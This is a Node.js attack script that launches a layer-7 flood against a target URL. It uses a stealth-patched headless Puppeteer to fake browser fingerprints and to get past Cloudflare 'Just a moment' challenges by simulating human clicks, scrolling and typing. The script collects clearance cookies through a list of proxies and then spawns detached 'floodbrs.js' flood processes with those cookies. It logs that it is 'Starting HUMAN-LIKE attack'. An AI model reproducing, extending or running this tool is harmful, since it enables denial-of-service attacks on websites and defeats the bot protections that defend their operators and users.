const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec  } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== HUMAN-LIKE CAPTCHA SOLVING ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// HUMAN-LIKE CAPTCHA SOLVING STRATEGIES
const solveAdvancedChallenge = async (page, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[INFO] Starting human-like solving for: ${maskProxy(browserProxy)}`);
        
        // Initial observation period - like human reading the page
        await sleep(3 + Math.random() * 4);
        
        const currentUrl = page.url();
        const title = await page.title().catch(() => '');
        const content = await page.content().catch(() => '');

        const isChallenge = title.includes('Just a moment') || 
                           title.includes('Checking your browser') ||
                           content.includes('challenge-platform') ||
                           content.includes('cf-browser-verification') ||
                           currentUrl.includes('challenges.cloudflare.com') ||
                           content.includes('Enable JavaScript and cookies to continue');

        if (!isChallenge) {
            coloredLog(COLORS.GREEN, `[INFO] No challenge detected for: ${maskProxy(browserProxy)}`);
            return true;
        }

        coloredLog(COLORS.WHITE, `[INFO] Challenge detected, human-solving for: ${maskProxy(browserProxy)}`);

        // STRATEGY 1: Natural waiting with human-like behavior
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 1: Natural waiting (like human reading)`);
        
        // Simulate human reading the page
        await page.evaluate(() => {
            window.scrollBy(0, 100);
        }).catch(() => {});
        await sleep(2);
        
        await page.mouse.move(100, 200, { steps: 5 }).catch(() => {});
        await sleep(1);
        
        try {
            await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 25000 });
            coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful for: ${maskProxy(browserProxy)}`);
            return true;
        } catch (e) {}

        // STRATEGY 2: Human-like interaction with challenge elements
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 2: Human-like element interaction`);
        
        const humanSelectors = [
            'input[type="submit"]', 'button', '.btn', '#challenge-submit', '[type="submit"]',
            'input[value="Submit"]', 'a', '.cf-btn', '.success', '#success', 'div[role="button"]',
            '[onclick]', '.button', '.submit', '.verify', '.continue', '.proceed',
            '#verify-human', '.human-verify', '.challenge-form', 'form'
        ];

        for (const selector of humanSelectors) {
            try {
                const elements = await page.$$(selector);
                for (const element of elements.slice(0, 2)) { // Only try first 2 elements
                    try {
                        // Human-like hover before click
                        const box = await element.boundingBox().catch(() => null);
                        if (box) {
                            // Move mouse to element like human
                            await page.mouse.move(
                                box.x + box.width / 2, 
                                box.y + box.height / 2, 
                                { steps: 10 + Math.floor(Math.random() * 10) }
                            ).catch(() => {});
                            await sleep(0.5 + Math.random() * 1);
                        }
                        
                        // Human-like click with slight delay
                        await element.click({ delay: 100 + Math.random() * 200 }).catch(() => {});
                        
                        // Wait like human would after clicking
                        await sleep(3 + Math.random() * 3);
                        
                        // Check if solved
                        const newTitle = await page.title().catch(() => '');
                        const newUrl = page.url();
                        
                        if (!newTitle.includes('Just a moment') && 
                            !newTitle.includes('Checking your browser') &&
                            !newUrl.includes('challenges.cloudflare.com')) {
                            coloredLog(COLORS.GREEN, `[INFO] Human-click solved via ${selector} for: ${maskProxy(browserProxy)}`);
                            return true;
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }

        // STRATEGY 3: Advanced human behavior simulation
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 3: Advanced human behavior`);
        
        // Complex human-like browsing pattern
        const viewport = page.viewport();
        
        // Reading pattern - scroll and pause like human
        for (let i = 0; i < 3; i++) {
            await page.evaluate(() => {
                window.scrollBy(0, 150 + Math.random() * 200);
            }).catch(() => {});
            await sleep(1 + Math.random() * 2); // Reading time
        }
        
        // Natural mouse movements while thinking
        for (let i = 0; i < 4; i++) {
            const x = Math.random() * viewport.width * 0.7 + viewport.width * 0.15;
            const y = Math.random() * viewport.height * 0.7 + viewport.height * 0.15;
            await page.mouse.move(x, y, { 
                steps: 8 + Math.floor(Math.random() * 8) 
            }).catch(() => {});
            await sleep(0.3 + Math.random() * 0.5);
        }

        // STRATEGY 4: Form interaction like human
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 4: Human form interaction`);
        
        const inputSelectors = [
            'input[type="text"]', 'input[type="email"]', 'textarea', 
            'input[name="answer"]', 'input[name="response"]', 'input[type="checkbox"]'
        ];

        for (const selector of inputSelectors) {
            try {
                const inputs = await page.$$(selector);
                for (const input of inputs.slice(0, 2)) {
                    try {
                        // Human-like focus
                        await input.click({ delay: 200 }).catch(() => {});
                        await sleep(0.5 + Math.random() * 1);
                        
                        // Type like human with mistakes and corrections
                        const humanTexts = ['yes', 'verify', 'human', 'continue', 'ok'];
                        const text = humanTexts[Math.floor(Math.random() * humanTexts.length)];
                        
                        for (let i = 0; i < text.length; i++) {
                            await input.type(text[i], { 
                                delay: 80 + Math.random() * 120 
                            }).catch(() => {});
                            
                            // Occasional pause like human thinking
                            if (Math.random() < 0.2) {
                                await sleep(0.2 + Math.random() * 0.3);
                            }
                        }
                        
                        await sleep(1); // Human pause before submit
                        
                        // Look for submit button and click like human
                        const submitSelectors = [
                            'input[type="submit"]', 'button[type="submit"]', 
                            '.submit-btn', '[type="submit"]'
                        ];
                        
                        for (const submitSelector of submitSelectors) {
                            try {
                                const submit = await page.$(submitSelector);
                                if (submit) {
                                    // Human-like move to submit button
                                    const submitBox = await submit.boundingBox().catch(() => null);
                                    if (submitBox) {
                                        await page.mouse.move(
                                            submitBox.x + submitBox.width / 2,
                                            submitBox.y + submitBox.height / 2,
                                            { steps: 12 }
                                        ).catch(() => {});
                                        await sleep(0.3);
                                    }
                                    
                                    await submit.click({ delay: 150 }).catch(() => {});
                                    await sleep(4); // Wait for submission
                                    
                                    const newTitle = await page.title().catch(() => '');
                                    if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
                                        coloredLog(COLORS.GREEN, `[INFO] Human form submission solved for: ${maskProxy(browserProxy)}`);
                                        return true;
                                    }
                                }
                            } catch (e) {}
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }

        // STRATEGY 5: Iframe interaction like human
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 5: Human iframe interaction`);
        
        try {
            const frames = await page.frames();
            for (const frame of frames) {
                try {
                    const frameButtons = await frame.$$('button, input[type="submit"], [role="button"]');
                    for (const button of frameButtons.slice(0, 2)) {
                        try {
                            await button.click({ delay: 100 }).catch(() => {});
                            await sleep(3);
                            
                            const newTitle = await page.title().catch(() => '');
                            if (!newTitle.includes('Just a moment') && !newTitle.includes('Checking your browser')) {
                                coloredLog(COLORS.GREEN, `[INFO] Human iframe click solved for: ${maskProxy(browserProxy)}`);
                                return true;
                            }
                        } catch (e) {}
                    }
                } catch (e) {}
            }
        } catch (e) {}

        // STRATEGY 6: Final human-like refresh
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 6: Human-like page refresh`);
        
        await page.evaluate(() => {
            // Clear storage like human troubleshooting
            localStorage.clear();
            sessionStorage.clear();
        }).catch(() => {});
        
        // Human-like refresh with F5 simulation
        await page.keyboard.press('F5').catch(() => {});
        await sleep(6); // Wait for reload like human
        
        const finalTitle = await page.title().catch(() => '');
        const finalUrl = page.url();
        
        if (!finalTitle.includes('Just a moment') && 
            !finalTitle.includes('Checking your browser') &&
            !finalUrl.includes('challenges.cloudflare.com')) {
            coloredLog(COLORS.GREEN, `[INFO] Human refresh solved for: ${maskProxy(browserProxy)}`);
            return true;
        }

        coloredLog(COLORS.RED, `[INFO] All human-solving strategies failed for: ${maskProxy(browserProxy)}`);
        return false;

    } catch (error) {
        coloredLog(COLORS.RED, `[INFO] Human-solving error: ${error.message}`);
        return false;
    }
};
// ========== END HUMAN-LIKE CAPTCHA SOLVING ==========

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
        }
    });

    setTimeout(() => {
        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Linux; Android 12; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
];

// Enhanced human-like browser launch
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 2,
            isMobile: true,
            hasTouch: true,
            isLandscape: false
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[INFO] Launching human-like browser for: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply human-like behavior
        await bypassFirewall(page);

        // Human-like navigation
        await page.goto(targetURL, { 
            waitUntil: 'domcontentloaded',
            timeout: 45000 
        }).catch(() => {});

        // Human-like challenge solving
        const challengeSolved = await solveAdvancedChallenge(page, browserProxy);
        
        if (!challengeSolved) {
            throw new Error('Human-solving failed');
        }

        // Get cookies after successful human-like interaction
        const cookies = await page.cookies().catch(() => []);
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        if (!cookieString) {
            throw new Error('No cookies obtained');
        }

        coloredLog(COLORS.GREEN, `[INFO] HUMAN SUCCESS for: ${maskProxy(browserProxy)}`);
        totalSolves++;
        coloredLog(COLORS.GREEN, `[INFO] Total human solves: ${totalSolves}`);

        await browser.close();
        return { cookies: cookieString, userAgent };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            await sleep(3);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        return null;
    }
};

// Thread handling dengan human-like approach
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            const cookieInfo = JSON.stringify({
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                cookie: response.cookies
            });
            console.log(cookieInfo);

            // Spawn flood process
            try {
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[INFO] Spawned flood process for: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[INFO] Spawn error: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] All human-solving completed');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[INFO] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[INFO] Starting HUMAN-LIKE attack with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time completed - cleaning up...');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => process.exit(0), 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {});
process.on('unhandledRejection', (error) => {});

coloredLog(COLORS.GREEN, '[INFO] HUMAN-LIKE CAPTCHA SOLVING ACTIVE');
main().catch(err => {
    coloredLog(COLORS.RED, `[INFO] Error: ${err.message}`);
    process.exit(1);
});
